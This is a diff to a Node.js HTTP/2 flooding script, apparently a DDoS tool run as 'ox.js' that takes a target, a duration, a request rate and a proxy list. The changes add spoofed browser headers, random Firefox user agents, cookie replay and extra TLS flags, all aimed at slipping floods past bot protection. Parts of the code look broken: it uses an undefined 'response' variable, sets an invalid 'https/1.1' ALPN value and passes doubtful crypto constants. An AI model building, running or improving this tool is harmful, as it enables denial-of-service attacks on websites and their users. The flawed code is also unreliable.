@@ -5,12 +5,18 @@ const net = require("net");
  const url = require("url");
  const crypto = require("crypto");
  const fs = require("fs");
- 
+ randomUseragent = require('random-useragent');
+ scp = require("set-cookie-parser"),
 
  lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
  accept_header = [
+    'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1', 
     'application/json',
+    'text/html,application/xml;q=0.9,application/xhtml+xml,image/png,image/webp,image/jpeg,image/gif,image/x-xbitmap,*/*;q=0.1', 
+    'image/png,image/*;q=0.8,*/*;q=0.5', 
+    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8', 
+    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5', 
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
@@ -33,18 +39,6 @@ const net = require("net");
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
   ],
-  encoding_header = [
-    'deflate, gzip;q=1.0, *;q=0.5',
-    'gzip, deflate, br',
-    '*'
-  ],
-  controle_header = [
-    'no-cache',
-    'no-store',
-    'no-transform',
-    'only-if-cached',
-    'max-age=0'
-  ],
  encoding_header = [
 'gzip, deflate, br',
 'compress, gzip',
@@ -53,12 +47,19 @@ const net = require("net");
 '*'
 ]
 
-
-
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
  process.on('uncaughtException', function (exception) {
   });
+
+  function cookieString(cookie) {
+    var s = "";
+    for (var c in cookie) {
+      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
+    }
+    var s = s.substring(1);
+    return s.substring(0, s.length - 1);
+  }
 
   if (process.argv.length < 7){console.log(`node ox.js target time rate thread proxy.txt`); process.exit();}
   const headers = {};
@@ -188,14 +189,13 @@ function getRandomUserAgent() {
     return finalString;
   }
 
+  let userAgent = randomUseragent.getRandom(function (ua) {
+    return ua.browserName === 'Firefox';
+});
+
   function UserAgents() {
     const userAgents = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/);
     return userAgents[Math.floor(Math.random() * userAgents.length)];
-  }
-
-  function UserAgen() {
-    const userAgent = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/);
-    return userAgent[Math.floor(Math.random() * userAgent.length)];
   }
 
   const Header = new NetSocket();
@@ -212,15 +212,22 @@ function getRandomUserAgent() {
   headers["x-requested-with"] = "XMLHttpRequest";
   headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
   headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
-
+  headers["user-agent"] = userAgent;
+  headers["origin"] = parsedTarget.protocol + "//" + parsedTarget.host;
+  headers["referer"] = parsedTarget.href;
+  headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+  headers["sec-ch-ua-mobile"] = "?0";
+  headers["sec-ch-ua-platform"] = '"Windows"';
+  headers["sec-fetch-user"] = "?1";
+  headers["upgrade-insecure-requests"] = 1;
  
  function runFlooder() {
+  headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
      headers[":authority"] = parsedTarget.host
      headers["user-agent"] = getRandomUserAgent();
      headers["user-agents"] = UserAgents();
-     headers["user-agen"] = UserAgen();
 
      const proxyOptions = {
          host: parsedProxy[0],
@@ -235,7 +242,7 @@ function getRandomUserAgent() {
          connection.setKeepAlive(true, 60000);
 
          const tlsOptions = {
-            ALPNProtocols: ['h2', 'http/1.1'],
+            ALPNProtocols: ['h2', 'https/1.1'],
             echdCurve: "GREASE:X25519:x25519",
             ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
             rejectUnauthorized: false,
@@ -253,6 +260,16 @@ function getRandomUserAgent() {
                            crypto.constants.SSL_OP_NO_SSLv2 |
                            crypto.constants.SSL_OP_NO_SSLv3 |
                            crypto.constants.SSL_OP_NO_TLSv1 |
+                           crypto.constants.ALPN_ENABLED |
+ crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+ crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+ crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+ crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+ crypto.constants.SSL_OP_PKCS1_CHECK_1 |
+ crypto.constants.SSL_OP_PKCS1_CHECK_2 |
+ crypto.constants.SSL_OP_SINGLE_DH_USE |
+ crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+ crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                            crypto.constants.SSL_OP_NO_TLSv1_1,
           };
 
